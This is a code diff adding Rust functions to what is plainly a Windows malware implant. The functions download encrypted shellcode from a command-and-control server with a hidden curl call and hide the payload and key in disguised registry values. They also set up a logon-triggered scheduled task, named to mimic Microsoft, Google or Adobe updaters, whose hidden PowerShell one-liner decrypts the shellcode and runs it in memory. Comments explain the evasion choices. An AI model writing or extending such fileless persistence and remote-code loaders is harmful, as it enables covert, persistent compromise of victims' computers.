@@ -537,6 +537,242 @@ pub fn persist_bits_job(_download_url: &str) -> Result<String, String> {
 }
 
 // ============================================================================
+// HTTP Shellcode Download
+// ============================================================================
+
+/// Downloads PIC shellcode from the C2 server's `/api/stage0/ester.sc` endpoint.
+///
+/// The server response is XOR-encrypted in transit with the following wire format:
+///   `[4-byte key-len LE][key bytes][encrypted shellcode]`
+///
+/// This function strips the transit encryption and returns the **raw** shellcode
+/// bytes, which can then be re-encrypted with a per-host key for registry storage.
+#[cfg(target_os = "windows")]
+pub fn download_shellcode_from_c2(url: &str) -> Result<Vec<u8>, String> {
+    debug_print!("[FILELESS] Downloading PIC shellcode from: {}", url);
+
+    // Use WinHTTP via curl LOLBin (already present on Win10+, no extra deps).
+    // curl writes raw bytes to a temp file; we read it back.
+    let temp_dir = std::env::var("TEMP").unwrap_or_else(|_| r"C:\Windows\Temp".to_string());
+    let temp_file = format!(r"{}\~df{:x}.tmp", temp_dir,
+        std::time::SystemTime::now()
+            .duration_since(std::time::UNIX_EPOCH)
+            .unwrap_or_default()
+            .as_millis() & 0xFFFF_FFFF
+    );
+
+    let curl_exe = obfstr!("curl").to_string();
+    let output = Command::new(&curl_exe)
+        .args(&["-s", "-L", "--connect-timeout", "30", "--max-time", "120", "-o", &temp_file, url])
+        .creation_flags(0x08000000)
+        .output()
+        .map_err(|e| format!("curl launch failed: {}", e))?;
+
+    if !output.status.success() {
+        let _ = std::fs::remove_file(&temp_file);
+        return Err(format!(
+            "curl download failed (exit {:?}): {}",
+            output.status.code(),
+            String::from_utf8_lossy(&output.stderr)
+        ));
+    }
+
+    let wire_bytes = std::fs::read(&temp_file)
+        .map_err(|e| format!("Failed to read temp file {}: {}", temp_file, e))?;
+    let _ = std::fs::remove_file(&temp_file);
+
+    if wire_bytes.len() < 4 {
+        return Err("Response too short (< 4 bytes)".to_string());
+    }
+
+    // Parse wire format: [4-byte key-len LE][key][encrypted shellcode]
+    let key_len = u32::from_le_bytes([wire_bytes[0], wire_bytes[1], wire_bytes[2], wire_bytes[3]]) as usize;
+    if wire_bytes.len() < 4 + key_len {
+        return Err(format!(
+            "Response truncated: need {} key bytes but only {} remain",
+            key_len,
+            wire_bytes.len() - 4
+        ));
+    }
+
+    let transit_key = &wire_bytes[4..4 + key_len];
+    let encrypted_sc = &wire_bytes[4 + key_len..];
+
+    // XOR-decrypt transit layer to recover raw shellcode
+    let shellcode: Vec<u8> = encrypted_sc
+        .iter()
+        .enumerate()
+        .map(|(i, &b)| b ^ transit_key[i % transit_key.len()])
+        .collect();
+
+    debug_print!(
+        "[FILELESS] Downloaded {} bytes shellcode ({} on wire, {} key)",
+        shellcode.len(),
+        wire_bytes.len(),
+        key_len
+    );
+
+    if shellcode.is_empty() {
+        return Err("Decrypted shellcode is empty".to_string());
+    }
+
+    Ok(shellcode)
+}
+
+#[cfg(not(target_os = "windows"))]
+pub fn download_shellcode_from_c2(_url: &str) -> Result<Vec<u8>, String> {
+    Err("Windows only".to_string())
+}
+
+// ============================================================================
+// Auto-Persist: Registry Shellcode + Scheduled Task Trigger
+// ============================================================================
+
+/// Full auto-persist pipeline: download shellcode → dual-split registry → schtask trigger.
+///
+/// This is the primary method called by `do_auto_persistence_work()`. It:
+/// 1. Downloads PIC shellcode from the C2 endpoint
+/// 2. Generates a per-host XOR key
+/// 3. Stores encrypted shellcode and key in two unrelated HKCU registry paths
+/// 4. Creates a scheduled task (ONLOGON) that runs a hidden loader:
+///    `conhost.exe --headless powershell.exe -NoP -W Hidden` which reads both
+///    registry values, XOR-decrypts, and executes the shellcode via
+///    VirtualAlloc+CreateThread (no .NET reflection, native PIC execution)
+///
+/// **Result**: zero files on disk. Shellcode survives reboots in registry.
+/// On every logon the schtask fires and the shellcode runs in memory.
+#[cfg(target_os = "windows")]
+pub fn persist_registry_shellcode_auto(shellcode_url: &str) -> Result<String, String> {
+    debug_print!("[FILELESS-AUTO] Starting registry shellcode auto-persist pipeline...");
+
+    // --- Step 1: Download shellcode from C2 ---
+    let shellcode = download_shellcode_from_c2(shellcode_url)?;
+    debug_print!("[FILELESS-AUTO] Got {} bytes of PIC shellcode", shellcode.len());
+
+    // --- Step 2: Generate per-host encryption key ---
+    let xor_key = generate_random_key();
+
+    // --- Step 3: Store in dual-split registry via existing function ---
+    let config = FilelessConfig {
+        download_url: Some(shellcode_url.to_string()),
+        shellcode: Some(shellcode),
+        encryption_key: xor_key,
+    };
+    persist_registry_shellcode(&config)?;
+
+    // --- Step 4: Replace the Run key with a scheduled task trigger ---
+    //     The Run key was already written by persist_registry_shellcode(),
+    //     but a scheduled task with /IT is more reliable (runs in user session,
+    //     survives interactive-only restrictions). We create the schtask and
+    //     leave the Run key as a backup (belt + suspenders).
+    create_schtask_registry_loader()?;
+
+    debug_print!("[FILELESS-AUTO] ✅ Registry shellcode auto-persist complete");
+    Ok("Registry shellcode + schtask trigger established (dual-split, no files on disk)".to_string())
+}
+
+#[cfg(not(target_os = "windows"))]
+pub fn persist_registry_shellcode_auto(_shellcode_url: &str) -> Result<String, String> {
+    Err("Windows only".to_string())
+}
+
+/// Creates a scheduled task that triggers the registry shellcode loader on logon.
+///
+/// The task runs `conhost.exe --headless` → PowerShell one-liner that reads both
+/// registry locations, XOR-decrypts, and executes shellcode in memory.
+/// Uses the same polymorphic task naming as the existing schtask persistence.
+#[cfg(target_os = "windows")]
+fn create_schtask_registry_loader() -> Result<(), String> {
+    // Machine-derived index for polymorphic naming (same logic as persist_scheduled_task_download)
+    let idx = {
+        let u = std::env::var("USERNAME").unwrap_or_default();
+        let c = std::env::var("COMPUTERNAME").unwrap_or_default();
+        u.bytes().chain(c.bytes())
+            .fold(0usize, |a, b| a.wrapping_mul(31).wrapping_add(b as usize))
+    };
+
+    let task_names = [
+        "MicrosoftEdgeUpdateService",
+        "GoogleUpdateTaskMachineUA",
+        "OneDriveStandaloneUpdaterTask",
+        "AdobeAcrobatUpdateCheck",
+    ];
+    let task_name = task_names[idx % task_names.len()];
+
+    // Registry paths matching those in persist_registry_shellcode()
+    let payload_reg = obfstr!(r"HKCU:\Software\Microsoft\InputPersonalization\TrainedDataStore").to_string();
+    let payload_val = obfstr!("UserData").to_string();
+    let key_reg     = obfstr!(r"HKCU:\Software\Microsoft\Windows\CurrentVersion\CloudStore\Cache\AccountsRoot\Settings").to_string();
+    let key_val     = obfstr!("SyncState").to_string();
+
+    // PowerShell one-liner: read dual registry → XOR decrypt → VirtualAlloc(RW) →
+    // memcpy → VirtualProtect(RX) → CreateThread → WaitForSingleObject.
+    // Uses RW→RX (not RWX) to reduce behavioural detection.
+    let ps_oneliner = format!(
+        concat!(
+            r#"$b=[Convert]::FromBase64String((gp '{pp}').{pv});"#,
+            r#"$x=[Convert]::FromBase64String((gp '{kp}').{kv});"#,
+            r#"for($i=0;$i -lt $b.Length;$i++){{$b[$i]=$b[$i] -bxor $x[$i%$x.Length]}};"#,
+            r#"$t=Add-Type -MemberDefinition '"#,
+            r#"[DllImport("k"+"ernel32")]public static extern IntPtr VirtualAlloc(IntPtr a,uint s,uint f,uint p);"#,
+            r#"[DllImport("k"+"ernel32")]public static extern bool VirtualProtect(IntPtr a,uint s,uint n,out uint o);"#,
+            r#"[DllImport("k"+"ernel32")]public static extern IntPtr CreateThread(IntPtr a,uint s,IntPtr f,IntPtr p,uint c,IntPtr i);"#,
+            r#"[DllImport("k"+"ernel32")]public static extern uint WaitForSingleObject(IntPtr h,uint m);"#,
+            r#"' -Name W -PassThru;"#,
+            r#"$v=$t::VirtualAlloc(0,$b.Length,0x3000,0x04);"#,      // MEM_COMMIT|RESERVE, PAGE_READWRITE
+            r#"[Runtime.InteropServices.Marshal]::Copy($b,0,$v,$b.Length);"#,
+            r#"$o=0;$t::VirtualProtect($v,$b.Length,0x20,[ref]$o)|Out-Null;"#,  // PAGE_EXECUTE_READ
+            r#"$h=$t::CreateThread(0,0,$v,0,0,0);"#,
+            r#"$t::WaitForSingleObject($h,0xFFFFFFFF)"#
+        ),
+        pp = payload_reg,
+        pv = payload_val,
+        kp = key_reg,
+        kv = key_val,
+    );
+
+    // conhost --headless hides the console; -NoP -NonI -W Hidden hides PS window.
+    // ping delay (~30s) waits for network stack and desktop to be ready after logon.
+    let task_cmd = format!(
+        "conhost.exe --headless cmd.exe /c ping 127.0.0.1 -n 31 >nul & powershell.exe -NoP -NonI -W Hidden -Ep Bypass -C \"{}\"",
+        ps_oneliner
+    );
+
+    let schtasks_exe = obfstr!("schtasks").to_string();
+
+    // Delete existing task if present (silent)
+    let _ = Command::new(&schtasks_exe)
+        .args(&["/Delete", "/TN", task_name, "/F"])
+        .creation_flags(0x08000000)
+        .output();
+
+    // Create scheduled task triggered on every logon
+    let output = Command::new(&schtasks_exe)
+        .args(&[
+            "/Create",
+            "/SC", "ONLOGON",
+            "/TN", task_name,
+            "/TR", &task_cmd,
+            "/F",
+            "/RL", "LIMITED",
+            "/IT",
+        ])
+        .creation_flags(0x08000000)
+        .output()
+        .map_err(|e| format!("Failed to create registry-loader schtask: {}", e))?;
+
+    if output.status.success() {
+        debug_print!("[FILELESS-AUTO] schtask '{}' created → registry shellcode loader", task_name);
+        Ok(())
+    } else {
+        Err(format!(
+            "schtask creation failed: {}",
+            String::from_utf8_lossy(&output.stderr)
+        ))
+    }
+}
+
+// ============================================================================
 // Main Fileless Persistence Function
 // ============================================================================
 
